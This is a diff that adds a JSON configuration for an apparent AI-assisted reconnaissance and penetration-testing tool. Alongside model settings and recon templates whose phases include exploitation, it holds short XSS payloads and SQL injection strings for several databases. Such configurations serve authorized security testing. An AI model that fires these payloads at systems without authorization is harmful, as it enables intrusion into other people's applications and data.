@@ -1,0 +1,99 @@
+{
+  "version": "1.0.0",
+  "ai_providers": {
+    "openai": {
+      "models": {
+        "gpt-4": {
+          "max_tokens": 4096,
+          "temperature": 0.7,
+          "cost_per_token": 0.00003
+        },
+        "gpt-4-turbo": {
+          "max_tokens": 4096,
+          "temperature": 0.7,
+          "cost_per_token": 0.00001
+        },
+        "gpt-3.5-turbo": {
+          "max_tokens": 4096,
+          "temperature": 0.7,
+          "cost_per_token": 0.000002
+        }
+      }
+    },
+    "anthropic": {
+      "models": {
+        "claude-3-opus": {
+          "max_tokens": 4096,
+          "temperature": 0.7,
+          "cost_per_token": 0.000015
+        },
+        "claude-3-sonnet": {
+          "max_tokens": 4096,
+          "temperature": 0.7,
+          "cost_per_token": 0.000003
+        }
+      }
+    },
+    "gemini": {
+      "models": {
+        "gemini-pro": {
+          "max_tokens": 2048,
+          "temperature": 0.7,
+          "cost_per_token": 0.0000005
+        }
+      }
+    }
+  },
+  "recon_templates": {
+    "enterprise": {
+      "description": "Enterprise-grade comprehensive reconnaissance",
+      "tools": ["subfinder", "amass", "dnscli", "permutcli", "httpcli", "vulncli", "cloudcli"],
+      "phases": ["intelligence", "discovery", "enumeration", "analysis", "validation", "reporting"],
+      "estimated_time": "4-8 hours"
+    },
+    "bug_bounty": {
+      "description": "Bug bounty optimized reconnaissance",
+      "tools": ["permutcli", "httpcli", "urlcli", "dirbcli", "vulncli", "takeovercli"],
+      "phases": ["discovery", "enumeration", "vulnerability_scan", "exploitation"],
+      "estimated_time": "2-4 hours"
+    },
+    "penetration_test": {
+      "description": "Penetration testing methodology",
+      "tools": ["dnscli", "httpcli", "vulncli", "vulnsqlicli", "portcli"],
+      "phases": ["reconnaissance", "scanning", "enumeration", "exploitation", "reporting"],
+      "estimated_time": "6-12 hours"
+    }
+  },
+  "payload_templates": {
+    "xss": {
+      "contexts": {
+        "html": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
+        "javascript": ["';alert(1);//", "\";alert(1);//"],
+        "attribute": ["\" onload=alert(1) \"", "' onload=alert(1) '"],
+        "url": ["%3Cscript%3Ealert(1)%3C/script%3E", "javascript:alert(1)"]
+      }
+    },
+    "sqli": {
+      "contexts": {
+        "mysql": ["' UNION SELECT 1,2,3--", "' OR '1'='1'--"],
+        "postgresql": ["'; SELECT version()--", "' UNION SELECT null,version()--"],
+        "mssql": ["' UNION SELECT @@version--", "'; WAITFOR DELAY '00:00:05'--"],
+        "oracle": ["' UNION SELECT banner FROM v$version--", "' OR '1'='1'--"]
+      }
+    }
+  },
+  "security_settings": {
+    "max_payload_length": 2048,
+    "allowed_payload_types": ["xss", "sqli", "lfi", "ssrf", "ssti"],
+    "rate_limiting": {
+      "requests_per_minute": 60,
+      "requests_per_hour": 1000
+    },
+    "logging": {
+      "enabled": true,
+      "log_queries": true,
+      "log_responses": false,
+      "retention_days": 30
+    }
+  }
+}
